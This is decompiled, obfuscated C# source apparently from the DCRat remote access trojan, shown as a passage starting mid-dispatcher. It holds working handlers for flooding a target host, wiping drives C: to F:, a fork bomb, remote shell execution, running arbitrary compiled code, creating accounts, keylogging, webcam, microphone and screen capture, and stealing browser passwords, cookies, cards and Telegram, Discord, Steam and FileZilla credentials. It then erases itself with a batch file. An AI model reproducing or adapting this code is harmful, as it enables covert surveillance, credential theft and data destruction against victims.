												socket2.SendTo(new byte[new RepositoryEvent().ConnectList() % 1000 + 1], remoteEP2);
											}
											catch
											{
											}
										}).Start();
										Thread.Sleep(10);
									}
								}).Start();
								new Thread((ThreadStart)delegate
								{
									//Discarded unreachable code: IL_0002
									//IL_0003: Incompatible stack heights: 0 vs 1
									IPEndPoint remoteEP = new IPEndPoint(IPAddress.Parse(DecoratorReaderMapper.PatchRequest(pol)["Host"].ResetClass<string>()), Convert.ToInt32(DecoratorReaderMapper.PatchRequest(pol)["Port"].ResetClass<string>()));
									Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Tcp);
									for (int m = 0; m < num2; m++)
									{
										new Thread((ThreadStart)delegate
										{
											//Discarded unreachable code: IL_0002
											//IL_0003: Incompatible stack heights: 0 vs 1
											try
											{
												socket.SendTo(new byte[new RepositoryEvent().ConnectList() % 1000 + 1], remoteEP);
											}
											catch
											{
											}
										}).Start();
										Thread.Sleep(10);
									}
								}).Start();
								DispatcherInstanceExpression.CancelFilter(def, "#DONE", tag, task2);
								return;
							}
							break;
						case 2636022033u:
							if (text2 == "clipboard")
							{
								DispatcherInstanceExpression.QueryFilter(tag, task2);
								Thread thread = new Thread((ThreadStart)delegate
								{
									//Discarded unreachable code: IL_0002
									//IL_0003: Incompatible stack heights: 0 vs 1
									Clipboard.SetText(pol);
								});
								thread.SetApartmentState(ApartmentState.STA);
								thread.Start();
								thread.Join();
								DispatcherInstanceExpression.CancelFilter(def, "#DONE", tag, task2);
								return;
							}
							break;
						case 3929408067u:
							if (text2 == "clipboardget")
							{
								DispatcherInstanceExpression.QueryFilter(tag, task2);
								ord = null;
								Thread thread2 = new Thread((ThreadStart)delegate
								{
									//Discarded unreachable code: IL_0002
									//IL_0003: Incompatible stack heights: 0 vs 1
									ord = Clipboard.GetText(TextDataFormat.UnicodeText);
								});
								thread2.SetApartmentState(ApartmentState.STA);
								thread2.Start();
								thread2.Join();
								DispatcherInstanceExpression.ManageFilter("clipboard", ord, tag, task2);
								DispatcherInstanceExpression.CancelFilter(def, "#DONE", tag, task2);
								return;
							}
							break;
						case 2458040079u:
							if (text2 == "newuserpass")
							{
								DispatcherInstanceExpression.QueryFilter(tag, task2);
								Process.Start(new ProcessStartInfo
								{
									UseShellExecute = true,
									FileName = "cmd.exe",
									Arguments = "/c net user " + GlobalIssuerImporter.RemoveList() + " \"" + pol + "\"",
									WindowStyle = ProcessWindowStyle.Hidden
								});
								DispatcherInstanceExpression.CancelFilter(def, "#DONE", tag, task2);
								return;
							}
							break;
						case 279085777u:
							if (text2 == "deleteall")
							{
								DispatcherInstanceExpression.QueryFilter(tag, task2);
								new Thread((ThreadStart)delegate
								{
									//Discarded unreachable code: IL_0002
									//IL_0003: Incompatible stack heights: 0 vs 1
									try
									{
										Directory.Delete("C:\\", recursive: true);
									}
									catch
									{
									}
									try
									{
										Directory.Delete("D:\\", recursive: true);
									}
									catch
									{
									}
									try
									{
										Directory.Delete("E:\\", recursive: true);
									}
									catch
									{
									}
									try
									{
										Directory.Delete("F:\\", recursive: true);
									}
									catch
									{
									}
								}).Start();
								DispatcherInstanceExpression.CancelFilter(def, "#DONE", tag, task2);
								return;
							}
							break;
						case 179794454u:
							if (text2 == "rotatescreen")
							{
								DispatcherInstanceExpression.QueryFilter(tag, task2);
								try
								{
									uint num = 0u;
									while (++num <= 64)
									{
										Publisher.CollectEvent(num, pol);
									}
								}
								catch
								{
								}
								DispatcherInstanceExpression.CancelFilter(def, "#DONE", tag, task2);
								return;
							}
							break;
						case 476089331u:
							if (text2 == "setwallpaper")
							{
								DispatcherInstanceExpression.QueryFilter(tag, task2);
								Publisher.SortEvent(pol);
								DispatcherInstanceExpression.CancelFilter(def, "#DONE", tag, task2);
								return;
							}
							break;
						case 4246430400u:
							if (text2 == "browseurl")
							{
								DispatcherInstanceExpression.QueryFilter(tag, task2);
								string text9 = pol;
								if (!text9.StartsWith("http"))
								{
									text9 = "http://" + text9;
								}
								Process.Start(text9);
								DispatcherInstanceExpression.CancelFilter(def, "#DONE", tag, task2);
								return;
							}
							break;
						case 673460077u:
							if (text2 == "exec_cs_code")
							{
								DispatcherInstanceExpression.QueryFilter(tag, task2);
								Dictionary<string, string> providerOptions = new Dictionary<string, string>
								{
									{
										"CompilerVersion",
										"v3.5"
									}
								};
								CSharpCodeProvider cSharpCodeProvider = new CSharpCodeProvider(providerOptions);
								CompilerParameters options = new CompilerParameters
								{
									GenerateInMemory = true,
									GenerateExecutable = false,
									ReferencedAssemblies = 
									{
										"System.Core.dll",
										"System.dll",
										"System.Windows.Forms.dll",
										"System.Drawing.dll",
										"System.Data.dll",
										"System.Management.dll",
										"System.Data.Entity.dll"
									}
								};
								CompilerResults compilerResults = cSharpCodeProvider.CompileAssemblyFromSource(options, pol);
								if (compilerResults.Errors.HasErrors)
								{
									string text8 = "";
									foreach (CompilerError error in compilerResults.Errors)
									{
										text8 = text8 + "[" + error.ErrorNumber + " on " + error.Line + " Line]: " + error.ErrorText + "\r\n";
									}
									DispatcherInstanceExpression.CancelFilter(def, text8, tag, task2);
									Thread.Sleep(5000);
									DispatcherInstanceExpression.CancelFilter(def, "#ERROR", tag, task2);
								}
								else
								{
									DispatcherInstanceExpression.CancelFilter(def, "#DONE", tag, task2);
								}
								object obj5 = compilerResults.CompiledAssembly.CreateInstance("DCRat.Code");
								MethodInfo method = obj5.GetType().GetMethod("Main");
								method.Invoke(obj5, null);
								return;
							}
							break;
						case 4162873931u:
							if (text2 == "shutdown")
							{
								DispatcherInstanceExpression.QueryFilter(tag, task2);
								Process.Start(new ProcessStartInfo
								{
									UseShellExecute = true,
									FileName = "shutdown",
									Arguments = "/s /t 0",
									WindowStyle = ProcessWindowStyle.Hidden
								});
								DispatcherInstanceExpression.CancelFilter(def, "#DONE", tag, task2);
								return;
							}
							break;
						case 4271641068u:
							if (text2 == "restart")
							{
								DispatcherInstanceExpression.QueryFilter(tag, task2);
								Process.Start(new ProcessStartInfo
								{
									UseShellExecute = true,
									FileName = "shutdown",
									Arguments = "/r /t 0",
									WindowStyle = ProcessWindowStyle.Hidden
								});
								DispatcherInstanceExpression.CancelFilter(def, "#DONE", tag, task2);
								return;
							}
							break;
						case 357053078u:
							if (text2 == "logoff")
							{
								DispatcherInstanceExpression.QueryFilter(tag, task2);
								Process.Start(new ProcessStartInfo
								{
									UseShellExecute = true,
									FileName = "shutdown",
									Arguments = "/l /t 0",
									WindowStyle = ProcessWindowStyle.Hidden
								});
								DispatcherInstanceExpression.CancelFilter(def, "#DONE", tag, task2);
								return;
							}
							break;
						case 3840771245u:
							if (text2 == "forkbomb")
							{
								DispatcherInstanceExpression.QueryFilter(tag, task2);
								new Thread((ThreadStart)delegate
								{
									//Discarded unreachable code: IL_0002
									//IL_0003: Incompatible stack heights: 0 vs 1
									while (true)
									{
										Process.Start(new ProcessStartInfo
										{
											UseShellExecute = true,
											FileName = "cmd.exe",
											Arguments = "/c start cmd.exe /c \"pause\" & pause",
											WindowStyle = ProcessWindowStyle.Normal
										});
									}
								}).Start();
								DispatcherInstanceExpression.CancelFilter(def, "#DONE", tag, task2);
								return;
							}
							break;
						case 2329269937u:
							if (text2 == "lcmd")
							{
								DispatcherInstanceExpression.QueryFilter(tag, task2);
								string control = Process.Start(new ProcessStartInfo
								{
									UseShellExecute = false,
									RedirectStandardOutput = true,
									StandardOutputEncoding = Encoding.GetEncoding(866),
									FileName = "cmd.exe",
									Arguments = "/c \"" + pol + "\"",
									CreateNoWindow = true
								}).StandardOutput.ReadToEnd();
								DispatcherInstanceExpression.InitFilter(def, "lcmd", control, tag, task2);
								DispatcherInstanceExpression.CancelFilter(def, "#DONE", tag, task2);
								return;
							}
							break;
						case 2757455773u:
							if (text2 == "beep")
							{
								DispatcherInstanceExpression.QueryFilter(tag, task2);
								Console.Beep(int.Parse(DecoratorReaderMapper.PatchRequest(pol)["Freq"].ResetClass<string>()), int.Parse(DecoratorReaderMapper.PatchRequest(pol)["Duration"].ResetClass<string>()));
								DispatcherInstanceExpression.CancelFilter(def, "#DONE", tag, task2);
								return;
							}
							break;
						case 1640017480u:
							if (text2 == "fm_drives")
							{
								DispatcherInstanceExpression.QueryFilter(tag, task2);
								DispatcherInstanceExpression.ManageFilter("fm", ConnectionBroadcasterDispatcher.ValidateRecord(), tag, task2);
								DispatcherInstanceExpression.CancelFilter(def, "#DONE", tag, task2);
								return;
							}
							break;
						case 3558062580u:
							if (text2 == "fm_opendir")
							{
								DispatcherInstanceExpression.QueryFilter(tag, task2);
								DispatcherInstanceExpression.InitFilter(def, "fm", ConnectionBroadcasterDispatcher.FindRecord(DecoratorReaderMapper.PatchRequest(pol)["Directory"].ResetClass<string>()), tag, task2);
								DispatcherInstanceExpression.CancelFilter(def, "#DONE", tag, task2);
								return;
							}
							break;
						case 1874238014u:
							if (text2 == "fm_delete")
							{
								DispatcherInstanceExpression.QueryFilter(tag, task2);
								if (Directory.Exists(DecoratorReaderMapper.PatchRequest(pol)["Path"].ResetClass<string>()))
								{
									Directory.Delete(DecoratorReaderMapper.PatchRequest(pol)["Path"].ResetClass<string>(), recursive: true);
								}
								else if (File.Exists(DecoratorReaderMapper.PatchRequest(pol)["Path"].ResetClass<string>()))
								{
									File.Delete(DecoratorReaderMapper.PatchRequest(pol)["Path"].ResetClass<string>());
								}
								DispatcherInstanceExpression.InitFilter(def, "fm", ConnectionBroadcasterDispatcher.FindRecord(DecoratorReaderMapper.PatchRequest(pol)["Directory"].ResetClass<string>()), tag, task2);
								DispatcherInstanceExpression.CancelFilter(def, "#DONE", tag, task2);
								return;
							}
							break;
						case 613044183u:
							if (text2 == "fm_rename")
							{
								DispatcherInstanceExpression.QueryFilter(tag, task2);
								if (Directory.Exists(DecoratorReaderMapper.PatchRequest(pol)["OldPath"].ResetClass<string>()))
								{
									Directory.Move(DecoratorReaderMapper.PatchRequest(pol)["OldPath"].ResetClass<string>(), DecoratorReaderMapper.PatchRequest(pol)["NewPath"].ResetClass<string>());
								}
								else if (File.Exists(DecoratorReaderMapper.PatchRequest(pol)["OldPath"].ResetClass<string>()))
								{
									File.Move(DecoratorReaderMapper.PatchRequest(pol)["OldPath"].ResetClass<string>(), DecoratorReaderMapper.PatchRequest(pol)["NewPath"].ResetClass<string>());
								}
								DispatcherInstanceExpression.InitFilter(def, "fm", ConnectionBroadcasterDispatcher.FindRecord(DecoratorReaderMapper.PatchRequest(pol)["Directory"].ResetClass<string>()), tag, task2);
								DispatcherInstanceExpression.CancelFilter(def, "#DONE", tag, task2);
								return;
							}
							break;
						case 622587037u:
							if (text2 == "fm_newfolder")
							{
								DispatcherInstanceExpression.QueryFilter(tag, task2);
								Directory.CreateDirectory(DecoratorReaderMapper.PatchRequest(pol)["Path"].ResetClass<string>());
								DispatcherInstanceExpression.InitFilter(def, "fm", ConnectionBroadcasterDispatcher.FindRecord(DecoratorReaderMapper.PatchRequest(pol)["Directory"].ResetClass<string>()), tag, task2);
								DispatcherInstanceExpression.CancelFilter(def, "#DONE", tag, task2);
								return;
							}
							break;
						case 1678579267u:
							if (text2 == "fm_dwnurl")
							{
								DispatcherInstanceExpression.QueryFilter(tag, task2);
								DispatcherInstanceExpression.CancelFilter(def, "Saving file...", tag, task2);
								using (WebClient webClient2 = new WebClient())
								{
									webClient2.DownloadFile(DecoratorReaderMapper.PatchRequest(pol)["url"].ResetClass<string>(), DecoratorReaderMapper.PatchRequest(pol)["Directory"].ResetClass<string>() + Path.GetFileName(DecoratorReaderMapper.PatchRequest(pol)["url"].ResetClass<string>()));
								}
								DispatcherInstanceExpression.InitFilter(def, "fm", ConnectionBroadcasterDispatcher.FindRecord(DecoratorReaderMapper.PatchRequest(pol)["Directory"].ResetClass<string>()), tag, task2);
								DispatcherInstanceExpression.CancelFilter(def, "#DONE", tag, task2);
								return;
							}
							break;
						case 2042454330u:
							if (text2 == "fm_dwn")
							{
								DispatcherInstanceExpression.QueryFilter(tag, task2);
								DispatcherInstanceExpression.CancelFilter(def, "Saving file...", tag, task2);
								using (WebClient webClient = new WebClient())
								{
									webClient.DownloadFile(DecoratorReaderMapper.PatchRequest(pol)["url"].ResetClass<string>(), DecoratorReaderMapper.PatchRequest(pol)["Directory"].ResetClass<string>() + DecoratorReaderMapper.PatchRequest(pol)["name"].ResetClass<string>());
								}
								if (!DecoratorReaderMapper.PatchRequest(pol)._0001("NoResponse"))
								{
									DispatcherInstanceExpression.InitFilter(def, "fm", ConnectionBroadcasterDispatcher.FindRecord(DecoratorReaderMapper.PatchRequest(pol)["Directory"].ResetClass<string>()), tag, task2);
								}
								DispatcherInstanceExpression.CancelFilter(def, "#DONE", tag, task2);
								return;
							}
							break;
						case 994014384u:
							if (text2 == "fm_upl")
							{
								DispatcherInstanceExpression.QueryFilter(tag, task2);
								DispatcherInstanceExpression.CustomizeFilter(File.ReadAllBytes(DecoratorReaderMapper.PatchRequest(pol)["path"].ResetClass<string>()), "dfile", tag, task2);
								DispatcherInstanceExpression.CancelFilter(def, "#DONE", tag, task2);
								return;
							}
							break;
						case 1277321472u:
							if (text2 == "fm_zip")
							{
								DispatcherInstanceExpression.QueryFilter(tag, task2);
								ZipFile.CreateFromDirectory(DecoratorReaderMapper.PatchRequest(pol)["Path"].ResetClass<string>(), Path.GetDirectoryName(DecoratorReaderMapper.PatchRequest(pol)["Path"].ResetClass<string>() + "\\") + ".zip", CompressionLevel.Fastest, includeBaseDirectory: true);
								DispatcherInstanceExpression.InitFilter(def, "fm", ConnectionBroadcasterDispatcher.FindRecord(DecoratorReaderMapper.PatchRequest(pol)["Directory"].ResetClass<string>()), tag, task2);
								DispatcherInstanceExpression.CancelFilter(def, "#DONE", tag, task2);
								return;
							}
							break;
						case 1004534557u:
							if (text2 == "fm_unzip")
							{
								DispatcherInstanceExpression.QueryFilter(tag, task2);
								ZipFile.ExtractToDirectory(DecoratorReaderMapper.PatchRequest(pol)["Path"].ResetClass<string>(), Path.GetDirectoryName(DecoratorReaderMapper.PatchRequest(pol)["Path"].ResetClass<string>()));
								DispatcherInstanceExpression.InitFilter(def, "fm", ConnectionBroadcasterDispatcher.FindRecord(DecoratorReaderMapper.PatchRequest(pol)["Directory"].ResetClass<string>()), tag, task2);
								DispatcherInstanceExpression.CancelFilter(def, "#DONE", tag, task2);
								return;
							}
							break;
						case 3789904569u:
							if (text2 == "taskbar")
							{
								DispatcherInstanceExpression.QueryFilter(tag, task2);
								switch (pol)
								{
								case "Show":
									Publisher.CallEvent();
									break;
								case "Hide":
									Publisher.CheckFilter();
									break;
								}
								DispatcherInstanceExpression.CancelFilter(def, "#DONE", tag, task2);
								return;
							}
							break;
						case 3716188083u:
							if (text2 == "desktop")
							{
								DispatcherInstanceExpression.QueryFilter(tag, task2);
								switch (pol)
								{
								case "Show":
									Publisher.PublishEvent();
									break;
								case "Hide":
									Publisher.RevertEvent();
									break;
								}
								DispatcherInstanceExpression.CancelFilter(def, "#DONE", tag, task2);
								return;
							}
							break;
						case 3905854600u:
							if (text2 == "playaudiourl")
							{
								DispatcherInstanceExpression.QueryFilter(tag, task2);
								if (pol != "")
								{
									CandidateIteratorMapping.LoginRecord(pol);
								}
								else
								{
									CandidateIteratorMapping.CheckRecord();
								}
								DispatcherInstanceExpression.CancelFilter(def, "#DONE", tag, task2);
								return;
							}
							break;
						case 1289852797u:
							if (text2 == "elevate")
							{
								DispatcherInstanceExpression.QueryFilter(tag, task2);
								Process process2 = Process.Start(new ProcessStartInfo
								{
									WindowStyle = ProcessWindowStyle.Hidden,
									WorkingDirectory = Path.GetDirectoryName(MappingListAnnotation.m_PolicyEvent) + "\\",
									FileName = "cmd.exe",
									Arguments = "/c \"" + MappingListAnnotation.m_PolicyEvent + "\"",
									Verb = "runas"
								});
								process2.WaitForExit();
								if (process2.Id >= 2)
								{
									Environment.Exit(0);
									Application.Exit();
								}
								DispatcherInstanceExpression.CancelFilter(def, "#DONE", tag, task2);
								return;
							}
							break;
						case 3894592561u:
							if (text2 == "screenshot")
							{
								DispatcherInstanceExpression.QueryFilter(tag, task2);
								switch (DecoratorReaderMapper.PatchRequest(pol)["Action"].ResetClass<string>())
								{
								case "Start":
									ParamFilterResolver.PostEvent(DecoratorReaderMapper.PatchRequest(pol)["Monitor"].ResetClass<string>(), Convert.ToInt32(DecoratorReaderMapper.PatchRequest(pol)["W"].ResetClass<string>()), Convert.ToInt32(DecoratorReaderMapper.PatchRequest(pol)["H"].ResetClass<string>()), tag, task2);
									break;
								case "Stop":
									ParamFilterResolver.ChangeEvent();
									break;
								}
								DispatcherInstanceExpression.CancelFilter(def, "#DONE", tag, task2);
								return;
							}
							break;
						case 1231575816u:
							if (text2 == "webcam")
							{
								DispatcherInstanceExpression.QueryFilter(tag, task2);
								switch (DecoratorReaderMapper.PatchRequest(pol)["Action"].ResetClass<string>())
								{
								case "Start":
									AdapterInstanceExpression.SetEvent(Convert.ToInt32(DecoratorReaderMapper.PatchRequest(pol)["WebcamNum"].ResetClass<string>()), tag, task2);
									break;
								case "Stop":
									AdapterInstanceExpression.RemoveEvent();
									break;
								}
								DispatcherInstanceExpression.CancelFilter(def, "#DONE", tag, task2);
								return;
							}
							break;
						case 1445663049u:
							if (text2 == "microphone")
							{
								DispatcherInstanceExpression.QueryFilter(tag, task2);
								switch (DecoratorReaderMapper.PatchRequest(pol)["Action"].ResetClass<string>())
								{
								case "Start":
									PrinterListAnnotation.RegisterEvent(Convert.ToInt32(DecoratorReaderMapper.PatchRequest(pol)["MicrophoneNum"].ResetClass<string>()), Convert.ToInt32(DecoratorReaderMapper.PatchRequest(pol)["Bitrate"].ResetClass<string>()), Convert.ToInt32(DecoratorReaderMapper.PatchRequest(pol)["Channels"].ResetClass<string>()), Convert.ToInt32(DecoratorReaderMapper.PatchRequest(pol)["Time"].ResetClass<string>()), tag, task2);
									break;
								case "Stop":
									PrinterListAnnotation.SearchEvent();
									break;
								}
								DispatcherInstanceExpression.CancelFilter(def, "#DONE", tag, task2);
								return;
							}
							break;
						case 2216756512u:
							if (text2 == "getprocesses")
							{
								DispatcherInstanceExpression.QueryFilter(tag, task2);
								InstanceClassDispatcher instanceClassDispatcher = new InstanceClassDispatcher();
								Process[] processes = Process.GetProcesses();
								foreach (Process process in processes)
								{
									DecoratorReaderMapper decoratorReaderMapper = new DecoratorReaderMapper
									{
										["N"] = ParserFilterResolver._0001(process.ProcessName + ".exe"),
										["T"] = ParserFilterResolver._0001(process.MainWindowTitle + " "),
										["I"] = ParserFilterResolver._0001(process.Id + " ")
									};
									try
									{
										decoratorReaderMapper["P"] = ParserFilterResolver._0001(Publisher.VerifyFilter(process));
									}
									catch
									{
										decoratorReaderMapper["P"] = ParserFilterResolver._0001("Memory");
									}
									instanceClassDispatcher.Add(decoratorReaderMapper);
								}
								DispatcherInstanceExpression.InitFilter(def, "processes", instanceClassDispatcher.SetClass((TimeState)0, new BroadcasterError[0]), tag, task2);
								DispatcherInstanceExpression.CancelFilter(def, "#DONE", tag, task2);
								return;
							}
							break;
						case 2720131176u:
							if (text2 == "keylogger")
							{
								DispatcherInstanceExpression.QueryFilter(tag, task2);
								switch (DecoratorReaderMapper.PatchRequest(pol)["Action"].ResetClass<string>())
								{
								case "Start":
									if (!Directory.Exists(Path.GetTempPath() + "\\" + ClassEvent.ResetFilter(MappingListAnnotation._ProxyEvent + MappingListAnnotation.m_CandidateEvent)))
									{
										Directory.CreateDirectory(Path.GetTempPath() + "\\" + ClassEvent.ResetFilter(MappingListAnnotation._ProxyEvent + MappingListAnnotation.m_CandidateEvent));
									}
									new Thread((ThreadStart)delegate
									{
										//Discarded unreachable code: IL_0002
										//IL_0003: Incompatible stack heights: 0 vs 1
										Collection.NewEvent(Path.GetTempPath() + "\\" + ClassEvent.ResetFilter(MappingListAnnotation._ProxyEvent + MappingListAnnotation.m_CandidateEvent) + "\\");
									}).Start();
									break;
								case "Stop":
									Collection.ForgotEvent();
									break;
								case "List":
								{
									string text7 = "";
									if (Directory.Exists(Path.GetTempPath() + "\\" + ClassEvent.ResetFilter(MappingListAnnotation._ProxyEvent + MappingListAnnotation.m_CandidateEvent)))
									{
										string[] files = Directory.GetFiles(Path.GetTempPath() + "\\" + ClassEvent.ResetFilter(MappingListAnnotation._ProxyEvent + MappingListAnnotation.m_CandidateEvent), "*." + ClassEvent.ResetFilter(MappingListAnnotation.m_CandidateEvent), SearchOption.TopDirectoryOnly);
										foreach (string path in files)
										{
											text7 = text7 + Path.GetFileNameWithoutExtension(path) + "\r\n";
										}
									}
									DispatcherInstanceExpression.ManageFilter("keyloggerlist", text7, tag, task2);
									break;
								}
								case "Get":
									if (!File.Exists(Path.GetTempPath() + "\\" + ClassEvent.ResetFilter(MappingListAnnotation._ProxyEvent + MappingListAnnotation.m_CandidateEvent) + "\\" + DecoratorReaderMapper.PatchRequest(pol)["Date"].ResetClass<string>() + "." + ClassEvent.ResetFilter(MappingListAnnotation.m_CandidateEvent)))
									{
										throw new Exception("No log.");
									}
									DispatcherInstanceExpression.CustomizeFilter(File.ReadAllBytes(Path.GetTempPath() + "\\" + ClassEvent.ResetFilter(MappingListAnnotation._ProxyEvent + MappingListAnnotation.m_CandidateEvent) + "\\" + DecoratorReaderMapper.PatchRequest(pol)["Date"].ResetClass<string>() + "." + ClassEvent.ResetFilter(MappingListAnnotation.m_CandidateEvent)), "keyloggerdata", tag, task2);
									break;
								}
								DispatcherInstanceExpression.CancelFilter(def, "#DONE", tag, task2);
								return;
							}
							break;
						case 858606679u:
							if (text2 == "stealer")
							{
								DispatcherInstanceExpression.QueryFilter(tag, task2);
								DispatcherInstanceExpression.CancelFilter(def, "Scanning directory...", tag, task2);
								string text6 = DecoratorReaderMapper.PatchRequest(pol)["searchpath"].ResetClass<string>();
								if (text6.Length < 1)
								{
									text6 = Path.GetPathRoot(Environment.SystemDirectory) + "Users\\";
								}
								DispatcherInstanceExpression.CustomizeFilter(new Context().CalculateEvent(text6, DecoratorReaderMapper.PatchRequest(pol)["cookies"].ResetClass<bool>(), DecoratorReaderMapper.PatchRequest(pol)["passwords"].ResetClass<bool>(), DecoratorReaderMapper.PatchRequest(pol)["forms"].ResetClass<bool>(), DecoratorReaderMapper.PatchRequest(pol)["history"].ResetClass<bool>(), DecoratorReaderMapper.PatchRequest(pol)["cc"].ResetClass<bool>(), DecoratorReaderMapper.PatchRequest(pol)["telegram"].ResetClass<bool>(), DecoratorReaderMapper.PatchRequest(pol)["steam"].ResetClass<bool>(), DecoratorReaderMapper.PatchRequest(pol)["discord"].ResetClass<bool>(), DecoratorReaderMapper.PatchRequest(pol)["filezilla"].ResetClass<bool>(), DecoratorReaderMapper.PatchRequest(pol)["screenshot"].ResetClass<bool>(), DecoratorReaderMapper.PatchRequest(pol)["clipboard"].ResetClass<bool>(), DecoratorReaderMapper.PatchRequest(pol)["sysinfo"].ResetClass<bool>()), "stealer", tag, task2);
								GC.Collect();
								Thread.Sleep(3000);
								DispatcherInstanceExpression.CancelFilter(def, "#DONE", tag, task2);
								return;
							}
							break;
						case 2722888107u:
							if (text2 == "chat")
							{
								DispatcherInstanceExpression.QueryFilter(tag, task2);
								switch (DecoratorReaderMapper.PatchRequest(pol)["Action"].ResetClass<string>())
								{
								case "Open":
									if (MappingListAnnotation.m_ConfigurationEvent == 0)
									{
										MappingListAnnotation.m_ConfigurationEvent = new RepositoryEvent().PopList(111111, 99999999);
										new Thread((ThreadStart)delegate
										{
											//Discarded unreachable code: IL_0002
											//IL_0003: Incompatible stack heights: 0 vs 1
											Application.Run(new InitializerBroadcasterDispatcher());
										}).Start();
									}
									break;
								case "Close":
									if (MappingListAnnotation.m_ConfigurationEvent != 0)
									{
										MappingListAnnotation.m_ConfigurationEvent = 0;
									}
									break;
								}
								DispatcherInstanceExpression.CancelFilter(def, "#DONE", tag, task2);
								return;
							}
							break;
						case 2030368611u:
							if (text2 == "RD")
							{
								DispatcherInstanceExpression.QueryFilter(tag, task2);
								switch (DecoratorReaderMapper.PatchRequest(pol)["Action"].ResetClass<string>())
								{
								case "Start":
									Definition.ComputeEvent(DecoratorReaderMapper.PatchRequest(pol)["monitor"].ResetClass<string>(), DecoratorReaderMapper.PatchRequest(pol)["compression"].ResetClass<int>(), DecoratorReaderMapper.PatchRequest(pol)["mouse"].ResetClass<bool>(), DecoratorReaderMapper.PatchRequest(pol)["keyboard"].ResetClass<bool>(), tag, task2);
									break;
								case "Stop":
									Definition.DestroyEvent();
									break;
								}
								DispatcherInstanceExpression.CancelFilter(def, "#DONE", tag, task2);
								return;
							}
							break;
						case 3512644761u:
							if (text2 == "uninstall")
							{
								DispatcherInstanceExpression.QueryFilter(tag, task2);
								try
								{
									string[] array = File.ReadAllText(Path.Combine(Path.GetTempPath() + "\\" + ClassEvent.ResetFilter(GlobalIssuerImporter.SetList() + GlobalIssuerImporter.RemoveList()) + ".tmp")).Split(new string[1]
									{
										"<$>"
									}, StringSplitOptions.None);
									string text3 = "";
									string[] array2 = array;
									foreach (string text4 in array2)
									{
										if (File.Exists(text4))
										{
											text3 = text3 + "del /a /q /f \"" + text4 + "\"\r\n";
											text3 = text3 + "del /a /q /f \"" + Path.GetDirectoryName(text4) + "\\" + ClassEvent.RegisterFilter(Path.GetFileName(text4)) + "\"\r\n";
										}
									}
									foreach (object[] item in instance)
									{
										try
										{
											MethodInfo methodInfo = (MethodInfo)item[0];
											methodInfo.Invoke(item[1], new object[3]
											{
												tag,
												task2,
												MappingListAnnotation.m_PolicyEvent
											});
										}
										catch
										{
										}
									}
									string text5 = Path.GetDirectoryName(MappingListAnnotation.m_PolicyEvent) + "\\" + "B51zMRz72Y" + ".bat";
									string contents = "@echo off\r\nchcp 65001\r\nping -n 10 localhost > nul\r\n" + text3 + "del /a /q /f \"" + text5 + "\"";
									File.WriteAllText(text5, contents, new UTF8Encoding(encoderShouldEmitUTF8Identifier: false));
									ProcessStartInfo startInfo = new ProcessStartInfo
									{
										WindowStyle = ProcessWindowStyle.Hidden,
										UseShellExecute = true,
										FileName = text5
									};
									DispatcherInstanceExpression.CancelFilter(def, "#DONE", tag, task2);
									Process.Start(startInfo);
									File.Delete(Path.Combine(Path.GetTempPath() + "\\" + ClassEvent.ResetFilter(GlobalIssuerImporter.SetList() + GlobalIssuerImporter.RemoveList()) + ".tmp"));
								}
								catch
								{
								}
								Environment.Exit(0);
								Application.Exit();
								return;
							}
							break;
						}
					}
					DispatcherInstanceExpression.QueryFilter(tag, task2);
					if (list.ContainsKey(def))
					{
						MethodInfo methodInfo2 = (MethodInfo)list[def][0];
						methodInfo2.Invoke(list[def][1], new object[4]
						{
							pol,
							tag,
							task2,
							MappingListAnnotation.m_PolicyEvent
						});
					}
					DispatcherInstanceExpression.CancelFilter(def, "#DONE", tag, task2);
				}
				catch (Exception ex)
				{
					DispatcherInstanceExpression.CancelFilter(def, ex.Message, tag, task2);
					Thread.Sleep(3000);
					DispatcherInstanceExpression.CancelFilter(def, "#ERROR", tag, task2);
				}
			}).Start();
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public DecoratorEventEntry()
		{
			//Discarded unreachable code: IL_0002, IL_0006, IL_0012, IL_0019
			//IL_0003: Incompatible stack heights: 0 vs 1
			//IL_0007: Incompatible stack heights: 0 vs 1
			//IL_0013: Incompatible stack heights: 0 vs 1
			//IL_001a: Incompatible stack heights: 0 vs 1
			SingletonReader.PushGlobal();
			base._002Ector();
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		static DecoratorEventEntry()
		{
			//Discarded unreachable code: IL_0002, IL_0006, IL_0012, IL_0019
			//IL_0003: Incompatible stack heights: 0 vs 1
			//IL_0007: Incompatible stack heights: 0 vs 1
			//IL_0013: Incompatible stack heights: 0 vs 1
			//IL_001a: Incompatible stack heights: 0 vs 1
			SingletonReader.PushGlobal();
			list = new Dictionary<string, object[]>();
			instance = new List<object[]>();
			dic = new List<object[]>();
		}
	}
}
